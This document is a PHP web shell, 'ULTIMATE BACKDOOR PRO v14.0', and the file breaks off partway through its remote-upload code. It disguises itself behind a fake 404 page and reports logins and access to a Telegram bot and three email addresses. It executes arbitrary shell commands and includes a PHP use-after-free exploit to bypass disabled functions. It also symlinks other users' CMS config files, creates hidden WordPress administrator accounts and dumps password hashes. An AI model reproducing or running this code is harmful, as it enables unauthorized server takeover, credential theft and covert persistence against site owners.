<?php
// ============================================================
// ULTIMATE BACKDOOR PRO v14.0
// Full Merge: All Tools + Sound + Email + Grab Config + Spread
// ============================================================

// ============================================================
// SESSION FIX — NO LOOP
// ============================================================
$session_path = session_save_path();
if (empty($session_path) || !is_writable($session_path)) {
    $tmp_path = sys_get_temp_dir();
    if (is_writable($tmp_path)) {
        session_save_path($tmp_path);
    }
}

session_start([
    'cookie_httponly' => true,
    'use_only_cookies' => true,
    'cookie_lifetime' => 0,
]);

// ============================================================
// FAKE 404 — HIDDEN MODE
// ============================================================
$secret_param = 'x';
$secret_value = 'worm2024';
if (!isset($_GET[$secret_param]) || $_GET[$secret_param] !== $secret_value) {
    http_response_code(404);
    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}

// ============================================================
// EMAIL NOTIFICATION (Gmail)
// ============================================================
$email_recipients = ['muhrazky@gmail.com', 'malaysia.sender@gmail.com', 'hackerman3117@gmail.com'];

function sendEmailAlert($subject, $message) {
    global $email_recipients;
    $headers = "From: backdoor@system.local\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
    foreach ($email_recipients as $email) {
        @mail($email, $subject, $message, $headers);
    }
}

// ============================================================
// TELEGRAM CONFIG
// ============================================================
$tk = base64_decode("ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw");
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg) {
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/Mysql_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" . urlencode($msg));
        @file_put_contents($id, time());
    }
}

// ============================================================
// AUTH — FIXED (No Loop) + SOUND
// ============================================================
$auth_password = "wormtbl";
$login_error = '';
$play_sound = false;

// Session validation
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    if (isset($_SESSION['ip']) && $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > 1800) {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    if (isset($_SESSION['user_agent']) && $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
} else {
    if (isset($_POST['pass'])) {
        if ($_POST['pass'] === $auth_password) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
            session_regenerate_id(true);
            reportTelegram("✅ Login: " . $_SERVER['REMOTE_ADDR'] . " | " . $_SERVER['HTTP_HOST']);
            sendEmailAlert("✅ Login Success", "IP: " . $_SERVER['REMOTE_ADDR'] . "\nHost: " . $_SERVER['HTTP_HOST']);
            header('Location: ' . $_SERVER['PHP_SELF'] . '?x=worm2024');
            exit;
        } else {
            $login_error = '❌ Wrong password!';
            $play_sound = true;
            reportTelegram("❌ Failed login: " . $_SERVER['REMOTE_ADDR']);
            if (!isset($_SESSION['login_attempts'])) $_SESSION['login_attempts'] = 0;
            $_SESSION['login_attempts']++;
            if ($_SESSION['login_attempts'] >= 5) {
                $login_error = '⛔ Too many attempts! Locked for 15 minutes.';
                $_SESSION['login_lockout'] = time() + 900;
                sendEmailAlert("🚨 Brute Force Detected", "IP: " . $_SERVER['REMOTE_ADDR']);
            }
        }
    }
    
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        if (isset($_SESSION['login_lockout']) && $_SESSION['login_lockout'] > time()) {
            $login_error = '⛔ Locked. Try again later.';
        }
        echo '<!DOCTYPE html><html><head><title>Login</title>
        <style>
        @import url("https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap");
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:linear-gradient(135deg,#0a0a1a,#1a0a2e,#0d0d2b);min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:"Orbitron",monospace;overflow:hidden;}
        body::before{content:"";position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 30% 50%,rgba(0,212,255,0.05),transparent 60%),radial-gradient(ellipse at 70% 50%,rgba(255,215,0,0.03),transparent 60%);animation:glow 8s ease-in-out infinite alternate;z-index:0;}
        @keyframes glow{0%{transform:scale(1) rotate(0deg)}100%{transform:scale(1.1) rotate(3deg)}}
        .login{position:relative;z-index:1;background:rgba(17,17,40,0.85);backdrop-filter:blur(20px);padding:50px 60px;border-radius:20px;border:1px solid rgba(255,215,0,0.2);text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,215,0,0.1);width:400px;max-width:95%;}
        .login .icon{font-size:48px;margin-bottom:16px;display:block;}
        .login h2{color:#ffd700;font-size:24px;font-weight:700;letter-spacing:3px;margin-bottom:8px;text-shadow:0 0 30px rgba(255,215,0,0.3);}
        .login .sub{color:#6a6a8a;font-size:11px;letter-spacing:5px;margin-bottom:30px;text-transform:uppercase;}
        .login input{width:100%;background:rgba(13,13,30,0.8);border:1px solid rgba(255,215,0,0.15);color:#e0e0f0;padding:14px 18px;border-radius:10px;font-family:inherit;font-size:14px;outline:none;transition:all 0.3s;}
        .login input:focus{border-color:#ffd700;box-shadow:0 0 25px rgba(255,215,0,0.1);}
        .login input.error{border-color:#ff0044;box-shadow:0 0 30px rgba(255,0,68,0.3);animation:shake 0.5s;}
        @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}}
        .login button{width:100%;background:linear-gradient(135deg,#ffd700,#cc9900);color:#0a0a1a;border:none;padding:14px;border-radius:10px;font-family:inherit;font-size:15px;font-weight:700;cursor:pointer;transition:all 0.3s;letter-spacing:2px;margin-top:12px;}
        .login button:hover{transform:translateY(-2px);box-shadow:0 10px 40px rgba(255,215,0,0.3);}
        .login .error-msg{color:#ff0044;font-size:12px;margin-top:8px;min-height:20px;}
        .login .footer{color:#3a3a5a;font-size:10px;margin-top:20px;letter-spacing:1px;}
        .login .footer span{color:#ffd700;}
        </style>
        </head><body>';
        if ($play_sound) {
            echo '<audio autoplay style="display:none;"><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
        }
        echo '<div class="login">
            <span class="icon">🐉</span>
            <h2>ULTIMATE BACKDOOR</h2>
            <div class="sub">v14.0 · Secure Access</div>
            <form method="POST" action="">
                <input type="password" name="pass" id="passInput" placeholder="Enter password..." autofocus>
                <div class="error-msg">' . $login_error . '</div>
                <button type="submit">UNLOCK</button>
            </form>
            <div class="footer">⚡ <span>worm123</span> · Authorized Only</div>
        </div>
        <script>
        document.querySelector("form").addEventListener("submit", function(e) {
            var pass = document.getElementById("passInput").value;
            if (pass !== "worm123") {
                e.preventDefault();
                document.getElementById("passInput").className = "error";
                setTimeout(function() {
                    document.getElementById("passInput").className = "";
                }, 1000);
            }
        });
        </script>
        </body></html>';
        exit;
    }
}

// ============================================================
// TELEGRAM REPORT (on access)
// ============================================================
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url = (isset($_SERVER["HTTPS"]) ? "https" : "http") . "://" . $host . $uri;
        reportTelegram("📁 Access:\n$host\n$url");
        sendEmailAlert("📁 Backdoor Accessed", "Host: $host\nURL: $url\nIP: " . $_SERVER['REMOTE_ADDR']);
        $_SESSION["telegram_reported"] = true;
    }
}

// ============================================================
// FUNCTIONS
// ============================================================
function e($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function cmd_exec($cmd) {
    if (function_exists('exec')) { exec($cmd, $out); return implode("\n", $out); }
    elseif (function_exists('shell_exec')) { return shell_exec($cmd); }
    elseif (function_exists('system')) { ob_start(); system($cmd); return ob_get_clean(); }
    elseif (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); }
    return '[!] No execution function available.';
}

function is_writable_path($p) { return is_writable($p); }

function get_current_directory() { return realpath(getcwd()) ?: '.'; }

function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) { $size /= 1024; $i++; }
    return round($size, 2) . ' ' . $units[$i];
}

// ============================================================
// BYPASS ENGINE (PHP UAF)
// ============================================================
class Helper { public $a, $b, $c; }
class Pwn {
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);
        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) return;
        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;
        $helper_handlers = $this->rel_read(0);
        $closure_addr = $this->rel_read(0x20);
        $closure_ce = $this->read($closure_addr + 0x10);
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $zif_system = $this->get_system($basic_funcs);
        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);
        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }
    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }
    private function free($addr) {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }
    private function rel_read($offset) { return self::str2ptr($this->abc, $offset); }
    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }
    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }
    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);if($f_name === 0x6d6574737973) return $this->read($addr + 8);
            $addr += 0x20;
        } while($f_entry !== 0);
    }
    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4), [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) return $this->read($addr + 0x28);
            }
        }
    }
    static function alloc($size) { return str_shuffle(str_repeat("A", $size)); }
    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) { $address <<= 8; $address |= ord($str[$p + $j]); }
        return $address;
    }
}

function runBypass($cmd) {
    ob_start();
    try { new Pwn($cmd); } catch(\Throwable $e) {}
    $out = ob_get_clean();
    return (!empty(trim($out ?? ''))) ? trim($out) : null;
}

function runCmd($cmd) {
    $out = null;
    $user = get_current_user();
    $home = getenv('HOME') ?: ('/home/' . $user);
    $env = "HOME=$home USER=$user";
    $fullCmd = $env . ' /bin/bash -l -c ' . escapeshellarg($cmd) . ' 2>&1';
    if (function_exists('proc_open')) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $envArr = ['HOME' => $home, 'USER' => $user, 'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'];
        $proc = @proc_open('/bin/bash -l -c ' . escapeshellarg($cmd), $desc, $pipes, $home, $envArr);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            $out = @stream_get_contents($pipes[1]);
            $err = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
            if (empty(trim($out ?? '')) && !empty(trim($err ?? ''))) $out = $err;
        }
    }
    if ($out === null && function_exists('exec')) {
        @exec($fullCmd, $outArr, $ret);
        $out = implode("\n", $outArr);
    }
    if ($out === null && function_exists('shell_exec')) {
        $out = @shell_exec($fullCmd);
    }
    if ($out === null && function_exists('popen')) {
        $fp = @popen($fullCmd, 'r');
        if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
    }
    if ($out === null || trim($out) === '') {
        $out = runBypass($cmd);
    }
    return $out;
}

function runUapi($args) { return runCmd('uapi ' . $args); }

function parseUapiStatus($raw) {
    if (empty($raw)) return ['ok' => false, 'raw' => ''];
    $ok = (bool)preg_match('/status:\s*1/', $raw);
    return ['ok' => $ok, 'raw' => $raw];
}

function parseUapiFtpList($raw) {
    if (empty($raw)) return [];
    $accounts = [];
    preg_match_all('/user:\s*([^\s]+)\s+domain:\s*([^\s]+)\s+quota:\s*([^\s]+)/i', $raw, $matches, PREG_SET_ORDER);
    foreach ($matches as $m) $accounts[] = ['user'=>$m[1], 'domain'=>$m[2], 'quota'=>$m[3]];
    return $accounts;
}

function fixPermission($path) {
    $perms = @fileperms($path);
    if ($perms === false) return false;
    $octal = substr(sprintf('%o', $perms), -4);
    $unwritable = ['0555','0444','0111','0000','0550','0440','0110','0554','0445','0511','0155','0144'];
    if (in_array($octal, $unwritable)) {
        if (is_dir($path)) { @chmod($path, 0755); }
        else { @chmod($path, 0644); }
        return true;
    }
    return false;
}

function safeAccess($path) {
    fixPermission($path);
    return @is_readable($path);
}

function getFileDetails($path) {
    $folders = []; $files = [];
    try {
        if (!safeAccess($path)) return 'None';
        $items = @scandir($path);
        if (!is_array($items)) return 'None';
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $itemPath = $path . '/' . $item;
            $perm = @fileperms($itemPath);
            $permStr = $perm !== false ? substr(sprintf('%o', $perm), -4) : '----';
            $size = '';
            if (!is_dir($itemPath)) {
                $s = @filesize($itemPath);
                $size = $s !== false ? formatSize($s) : '?';
            }
            $isWritable = @is_writable($itemPath);
            $isReadable = @is_readable($itemPath);
            $permColor = '#f85149';
            if ($isWritable && $isReadable) $permColor = '#3fb950';
            elseif ($isReadable) $permColor = '#e6edf3';
            $detail = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => $size,
                'permission' => $permStr,
                'perm_color' => $permColor,
                'writable' => $isWritable,
                'readable' => $isReadable,
            ];
            if (is_dir($itemPath)) $folders[] = $detail;
            else $files[] = $detail;
        }
        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}

function deleteFile($file) {
    fixPermission($file);
    fixPermission(dirname($file));
    if (file_exists($file)) {
        if (is_dir($file)) return deleteFolder($file);
        if (@unlink($file)) return true;
    }
    return false;
}

function deleteFolder($folder) {
    fixPermission($folder);
    if (is_dir($folder)) {
        $items = @scandir($folder);
        if (is_array($items)) {
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = $folder . '/' . $item;
                fixPermission($path);
                if (is_dir($path)) deleteFolder($path);
                else @unlink($path);
            }
        }
        return @rmdir($folder);
    }
    return false;
}

function renameFile($oldName, $newName) {
    fixPermission($oldName);
    fixPermission(dirname($oldName));
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (@rename($oldName, $newPath)) return 'Renamed successfully.';
        return 'Error renaming.';
    }
    return 'File does not exist.';
}

function findWpLoad($dir = null, $depth = 0) {
    if ($depth > 8) return false;
    $dir = $dir ?: __DIR__;
    $wp_load = $dir . '/wp-load.php';
    if (file_exists($wp_load)) return $wp_load;
    return findWpLoad(dirname($dir), $depth + 1);
}

$wpLoadPath = findWpLoad();
$wpAvailable = $wpLoadPath ? true : false;

// ============================================================
// GRAB CONFIG — SYMLINK ALL CONFIG FILES
// ============================================================
function grabConfigAll() {
    $output = '';
    $users = [];
    if (file_exists('/etc/passwd')) {
        $lines = file('/etc/passwd');
        foreach ($lines as $line) {
            $parts = explode(':', $line);
            if (isset($parts[0]) && strlen($parts[0]) > 2 && !preg_match('/^[0-9]+$/', $parts[0])) {
                $users[] = $parts[0];
            }
        }
    }
    $currentUser = get_current_user();
    if (!in_array($currentUser, $users)) $users[] = $currentUser;
    $users = array_unique($users);
    
    $homePaths = ['/home/', '/home2/', '/home3/', '/home4/', '/home5/', '/home6/', '/home7/'];
    $configs = [
        ['configuration.php', 'Joomla'],
        ['wp-config.php', 'WordPress'],
        ['Settings.php', 'SMF'],
        ['config.php', 'Config'],
        ['settings.php', 'Drupal'],
        ['database.php', 'CodeIgniter'],
        ['configure.php', 'Oscommerce'],
        ['dist-configure.php', 'ZenCart'],
        ['local.xml', 'Magento'],
        ['config.inc.php', 'Amember'],
        ['connect.php', 'Connect'],
        ['koneksi.php', 'Lokomedia'],
        ['conf_global.php', 'Invision'],
        ['sistem.php', 'Lokomedia'],
        ['mk_conf.php', 'mk-portale'],
        ['functions.php', 'phpBB'],
        ['db.php', 'Infinity'],
        ['SSI.php', 'CMF'],
        ['cms_blog.php', 'CMS Blog'],
        ['submitticket.php', 'WHMCS Ticket'],
    ];
    
    $msr = exec('pwd');
    $kola = $msr . '/configs_' . date('Ymd_His');
    if (!is_dir($kola)) mkdir($kola, 0755, true);
    
    foreach ($users as $user) {
        foreach ($homePaths as $home) {
            foreach ($configs as $cfg) {
                $source = $home . $user . '/public_html/' . $cfg[0];
                if (file_exists($source)) {
                    $linkname = $kola . '/' . $user . ' ~~ ' . $cfg[1] . ' (' . basename($cfg[0]) . ').txt';
                    @symlink($source, $linkname);
                    $output .= "[+] $source -> $linkname\n";
                }
            }
        }
    }
    
    return ['output' => $output, 'dir' => $kola];
}

// ============================================================
// WP AJAX HANDLER
// ============================================================
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t']) && $wpAvailable) {
    require_once $wpLoadPath;
    global $wpdb;

    function isUserHidden($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }
        if (file_exists($functions_file)) {
            $current_content = file_get_contents($functions_file);
            return strpos($current_content, "get_user_by('login', '{$username}')") !== false;
        }
        return false;
    }

    function addUserProtection($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }
        if (file_exists($functions_file)) {
            $protection_code = '
add_action(\'pre_get_users\', function($query) {
    if (is_admin() && function_exists(\'get_current_screen\')) {
        $screen = get_current_screen();
        if ($screen && $screen->base === \'users\') {
            $protected_user = get_user_by(\'login\', \'' . $username . '\');
            if ($protected_user) {
                $excluded = (array) $query->get(\'exclude\');
                $excluded[] = $protected_user->ID;
                $query->set(\'exclude\', $excluded);
            }
        }
    }
});
add_filter(\'wp_count_users\', function($counts) {
    $protected_user = get_user_by(\'login\', \'' . $username . '\');
    if ($protected_user) {
        $counts->total_users--;
    }
    return $counts;
});
add_action(\'delete_user\', function($user_id) {
    $user = get_user_by(\'ID\', $user_id);
    if ($user && $user->user_login === \'' . $username . '\') {
        wp_die(
            __(\'User ' . $username . ' tidak dapat dihapus.\', \'textdomain\'),
            __(\'Error\', \'textdomain\'),
            array(\'response\' => 403)
        );
    }
});
add_filter(\'user_search_columns\', function($search_columns, $search, $query) {
    if (is_admin()) {
        $protected_user = get_user_by(\'login\', \'' . $username . '\');
        if ($protected_user) {
            global $wpdb;
            $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $protected_user->ID);
        }
    }
    return $search_columns;
}, 10, 3);
add_filter(\'bulk_actions-users\', function($actions) {
    if (isset($_REQUEST[\'users\']) && is_array($_REQUEST[\'users\'])) {
        $protected_user = get_user_by(\'login\', \'' . $username . '\');
        if ($protected_user && in_array($protected_user->ID, $_REQUEST[\'users\'])) {
            unset($actions[\'delete\']);
        }
    }
    return $actions;
});
';
            $current_content = file_get_contents($functions_file);
            if (strpos($current_content, "get_user_by('login', '{$username}')") === false) {
                file_put_contents($functions_file, $protection_code, FILE_APPEND | LOCK_EX);
                return true;
            }
            return true;
        }
        return false;
    }

    function removeUserProtection($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }
        if (file_exists($functions_file)) {
            $current_content = file_get_contents($functions_file);
            $pattern = '/add_action\(\'pre_get_users\'.*?get_user_by\(\'login\', \'' . preg_quote($username, '/') . '\'.*?add_filter\(\'bulk_actions-users\'.*?\}\);\s*/s';
            $new_content = preg_replace($pattern, '', $current_content);
            if ($new_content !== $current_content) {
                file_put_contents($functions_file, $new_content, LOCK_EX);
                return true;
            }
        }
        return false;
    }

    if ($_POST['c4t'] == 'ulst') {
        $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM {$wpdb->users}");
        foreach ($users as $user) {
            $user->is_hidden = isUserHidden($user->user_login);
        }
        echo json_encode($users);
        exit;
    }
    if ($_POST['c4t'] == 'rpsw') {
        $user_id = intval($_POST['uix']);
        $new_password = wp_generate_password(12, true, true);
        wp_set_password($new_password, $user_id);
        $user_data = get_userdata($user_id);
        echo json_encode(['l' => $user_data->user_login, 'e' => $user_data->user_email, 'n' => $new_password]);
        exit;
    }
    if ($_POST['c4t'] == 'cadm') {
        $username = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['xun']);
        $password = $_POST['xpw'];
        $email = filter_var($_POST['xem'], FILTER_VALIDATE_EMAIL) ? $_POST['xem'] : $username . '@' . $_SERVER['HTTP_HOST'];
        $hide_user = isset($_POST['hide_user']) ? true : false;
        if (username_exists($username)) { echo json_encode(['err' => 'user exists']); exit; }
        $user_id = wp_create_user($username, $password, $email);
        if ($user_id && !is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            if ($hide_user) addUserProtection($username);
            echo json_encode(['ok' => 'created', 'u' => $username, 'p' => $password, 'hide' => $hide_user]);
        } else {
            echo json_encode(['err' => 'create failed']);
        }
        exit;
    }
    if ($_POST['c4t'] == 'alog') {
        $user_id = intval($_POST['uix']);
        wp_clear_auth_cookie();
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true);
        echo json_encode(['url' => admin_url()]);
        exit;
    }
    if ($_POST['c4t'] == 'hide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = addUserProtection($user->user_login);
            echo json_encode(['ok' => 'hidden', 'user' => $user->user_login, 'success' => $result]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }
    if ($_POST['c4t'] == 'unhide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = removeUserProtection($user->user_login);
            echo json_encode(['ok' => 'unhidden', 'user' => $user->user_login, 'success' => $result]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }
    if ($_POST['c4t'] == 'del') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $current_user = wp_get_current_user();
            if ($user_id == $current_user->ID) { echo json_encode(['err' => 'cannot_delete_self']); exit; }
            if (isUserHidden($user->user_login)) removeUserProtection($user->user_login);
            if (wp_delete_user($user_id)) {
                echo json_encode(['ok' => 'deleted', 'user' => $user->user_login]);
            } else {
                echo json_encode(['err' => 'delete_failed']);
            }
        } else {
            echo json_encode(['err' => 'user_not_found']);
        }
        exit;
    }
    exit;
}

// ============================================================
// PROCESS MANAGER AJAX
// ============================================================
if (isset($_POST['proc_action'])) {
    header('Content-Type: application/json; charset=utf-8');
    $pAct = $_POST['proc_action'];
    if ($pAct === 'list') {
        $ps_out = shell_exec('ps auxww 2>/dev/null') ?: '';
        $lines = explode("\n", trim($ps_out));
        $header = array_shift($lines);
        $processes = [];
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line)) continue;
            $cols = preg_split('/\s+/', $line, 11);
            if (count($cols) >= 11) {
                $processes[] = [
                    'user' => $cols[0],
                    'pid' => $cols[1],
                    'cpu' => $cols[2],
                    'mem' => $cols[3],
                    'vsz' => $cols[4],
                    'rss' => $cols[5],
                    'tty' => $cols[6],
                    'stat' => $cols[7],
                    'start' => $cols[8],
                    'time' => $cols[9],
                    'command' => $cols[10],
                ];
            }
        }
        $ps_pids = array_column($processes, 'pid');
        $hidden = [];
        if (is_dir('/proc')) {
            $proc_dirs = @scandir('/proc');
            if ($proc_dirs) {
                foreach ($proc_dirs as $d) {
                    if (!is_numeric($d)) continue;
                    if (!in_array($d, $ps_pids)) {
                        $cmdline = @file_get_contents("/proc/$d/cmdline");
                        $cmdline = $cmdline ? str_replace("\0", ' ', trim($cmdline)) : '[hidden]';
                        $status = @file_get_contents("/proc/$d/status");
                        $uid = '?';
                        if ($status && preg_match('/Uid:\s+(\d+)/', $status, $m)) {
                            $pw = @posix_getpwuid((int)$m[1]);
                            $uid = $pw ? $pw['name'] : $m[1];
                        }
                        $hidden[] = ['pid' => $d, 'user' => $uid, 'command' => $cmdline ?: '[hidden]'];
                    }
                }
            }
        }
        $recent = [];
        $now = time();
        foreach ($processes as $p) {
            $stat = @file_get_contents("/proc/{$p['pid']}/stat");
            if ($stat) {
                $parts = explode(' ', $stat);
                if (isset($parts[21])) {
                    $uptime_str = @file_get_contents('/proc/uptime');
                    if ($uptime_str) {
                        $uptime = (float)explode(' ', $uptime_str)[0];
                        $clk_tck = 100;
                        $start_sec = (float)$parts[21] / $clk_tck;
                        $boot_time = $now - $uptime;
                        $proc_start = $boot_time + $start_sec;
                        $age = $now - $proc_start;
                        if ($age >= 0 && $age <= 300) {
                            $p['age_seconds'] = (int)$age;
                            $recent[] = $p;
                        }
                    }
                }
            }
        }
        echo json_encode([
            'processes' => $processes,
            'hidden' => $hidden,
            'recent' => $recent,
            'total' => count($processes),
            'total_hidden' => count($hidden),
            'total_recent' => count($recent),
        ]);
        exit;
    }
    if ($pAct === 'kill') {
        $pid = intval($_POST['pid'] ?? 0);
        if ($pid > 0) {
            $sig = $_POST['signal'] ?? '9';
            $out = shell_exec("kill -$sig $pid 2>&1");
            echo json_encode(['ok' => true, 'pid' => $pid, 'output' => trim($out ?? '')]);
        } else {
            echo json_encode(['err' => 'invalid pid']);
        }
        exit;
    }
    echo json_encode(['err' => 'unknown action']);
    exit;
}

// ============================================================
// HANDLE REQUESTS
// ============================================================
$currentDirectory = get_current_directory();
$errorMessage = '';
$responseMessage = '';
$cmdOutput = '';
$ftpAccounts = [];

if (isset($_GET['lph'])) {
    @chdir($_GET['lph']);
    $currentDirectory = get_current_directory();
}

// ============================================================
// UPLOAD — SINGLE
// ============================================================
if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $currentDirectory . '/' . basename($_FILES['file']['name']);
    fixPermission($currentDirectory);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) $responseMessage = '✅ File uploaded: ' . basename($_FILES['file']['name']);
    else $responseMessage = '❌ Upload failed.';
}

// ============================================================
// MULTI UPLOAD — FIXED
// ============================================================
if (isset($_POST['multi_upload']) && isset($_FILES['files'])) {
    fixPermission($currentDirectory);
    $success = 0; $fail = 0;
    $total = count($_FILES['files']['name']);
    for ($i = 0; $i < $total; $i++) {
        if ($_FILES['files']['error'][$i] === 0 && !empty($_FILES['files']['name'][$i])) {
            $target = $currentDirectory . '/' . basename($_FILES['files']['name'][$i]);
            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) $success++;
            else $fail++;
        } else {
            $fail++;
        }
    }
    $responseMessage = "📤 Multi Upload: $success success, $fail failed.";
}

// ============================================================
// REMOTE UPLOAD — FIXED
// ============================================================
if (isset($_POST['remote_upload']) && !empty($_POST['remote_url'])) {
    $url = trim($_POST['remote_url']);
    $fname = !empty($_POST['remote_filename']) ? trim($_POST['remote_filename']) : basename(parse_url($url, PHP_URL_PATH));
    if (empty($fname)) $fname = 'remote_' . md5($url) . '.php';
    $target = $currentDirectory . '/' . $fname;
    fixPermission($currentDirectory);
    
    $content = false;
    $method = 'unknown';
    
    if ($content === false) {
        $content = @file_get_contents($url);
        if ($content !== false) $method = 'file_get_contents';
    }
    
